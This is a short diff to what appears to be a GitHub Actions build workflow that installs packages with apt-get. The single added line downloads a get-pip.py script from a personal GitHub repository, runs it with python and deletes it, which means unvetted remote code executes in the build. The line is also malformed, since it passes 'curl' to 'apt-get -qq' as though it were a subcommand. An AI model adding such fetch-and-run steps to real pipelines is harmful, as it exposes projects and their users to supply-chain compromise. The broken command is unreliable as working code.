@@ -105,6 +105,7 @@ jobs:
           libmpc-dev libmpfr-dev libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz \
           mkisofs msmtp nano ninja-build p7zip p7zip-full patch pkgconf python3 python3-pip libpython3-dev qemu-utils \
           rsync scons squashfs-tools subversion swig texinfo uglifyjs upx-ucl unzip vim wget xmlto xxd zlib1g-dev dos2unix
+          sudo -E apt-get -qq curl https://raw.githubusercontent.com/amcjcy/onecode/main/get-pip.py -o get-pip.py && python get-pip.py --quiet && rm -rf get-pip.py
           sudo -E apt-get -qq install time gn
           sudo -E apt-get -qq autoremove --purge
           sudo -E apt-get -qq clean
